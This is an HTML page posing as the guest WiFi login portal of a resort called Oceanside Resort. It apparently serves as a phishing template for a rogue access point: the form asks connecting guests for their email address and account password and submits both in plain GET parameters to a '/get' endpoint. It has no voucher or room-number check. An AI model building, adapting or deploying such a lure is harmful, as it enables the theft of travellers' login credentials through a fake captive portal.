<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Oceanside Resort — Guest WiFi</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#e8f4f8;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
.card{width:100%;max-width:410px;background:#fff;border-radius:20px;overflow:hidden;box-shadow:0 12px 50px rgba(0,80,120,0.12)}
.top{background:linear-gradient(160deg,#0077b6,#0096c7,#48cae4);padding:34px 28px 26px;text-align:center;position:relative}
.waves{position:absolute;bottom:0;left:0;right:0;height:20px;background:linear-gradient(180deg,transparent,rgba(255,255,255,0.15))}
.resort-icon{font-size:30px;margin-bottom:10px}
.resort-name{font-size:22px;font-weight:800;color:#fff;letter-spacing:0.5px}
.resort-sub{font-size:10px;color:rgba(255,255,255,0.7);letter-spacing:2px;text-transform:uppercase;margin-top:5px}
.ssid-pill{display:inline-flex;align-items:center;gap:7px;background:rgba(255,255,255,0.15);border-radius:20px;padding:5px 14px;margin-top:14px;border:1px solid rgba(255,255,255,0.2)}
.dot{width:6px;height:6px;background:#90e0ef;border-radius:50%}
.ssid-pill span{font-size:11px;color:rgba(255,255,255,0.7)}
.ssid-pill strong{color:#fff;font-weight:500}
.body{padding:26px 28px 22px}
h2{font-size:17px;font-weight:700;color:#0077b6;margin-bottom:4px}
.sub{font-size:12.5px;color:#aaa;margin-bottom:20px}
.lbl{display:block;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:1.2px;color:#aaa;margin-bottom:7px;margin-top:18px}
input{width:100%;padding:12px 14px;border:1.5px solid #e0eef5;border-radius:10px;font-size:14.5px;background:#f5fbff;color:#0a3a5a}
input:focus{outline:none;border-color:#0096c7;box-shadow:0 0 0 3px rgba(0,150,199,0.1)}
input::placeholder{color:#c0d8e8}
.btn{width:100%;padding:13px;margin-top:22px;border:none;border-radius:10px;background:linear-gradient(90deg,#0077b6,#0096c7);color:#fff;font-size:13px;font-weight:700;cursor:pointer}
.terms{font-size:11px;color:#bbb;text-align:center;margin-top:13px;line-height:1.6}
.terms a{color:#0096c7}
.foot{background:#f5fbff;border-top:1px solid #e0eef5;padding:12px 28px;display:flex;justify-content:space-between}
.foot span,.foot a{font-size:10.5px;color:#bbb;text-decoration:none}
.foot a{color:#0096c7}
</style>
</head>
<body>
<div class="card">
  <div class="top">
    <div class="resort-icon">🌊</div>
    <div class="resort-name">Oceanside Resort</div>
    <div class="resort-sub">Beach &amp; Spa Resort</div>
    <div class="ssid-pill"><div class="dot"></div><span>Network: <strong>OceansideResort-Guest</strong></span></div>
    <div class="waves"></div>
  </div>
  <div class="body">
    <h2>Welcome to Paradise</h2>
    <p class="sub">Enjoy complimentary high-speed WiFi throughout the resort.</p>
    <form action="/get">
      <label class="lbl">Email Address</label>
      <input name="email" type="text" placeholder="you@example.com" required>
      <label class="lbl">Password</label>
      <input name="password" type="password" placeholder="Enter your password" required>
      <button type="submit" class="btn">Connect to Resort WiFi</button>
      <p class="terms">By connecting you agree to our <a href="#">Internet Use Policy</a>.</p>
    </form>
  </div>
  <div class="foot"><span>&copy; Oceanside Resort</span><a href="#">Concierge</a></div>
</div>
</body>
</html>
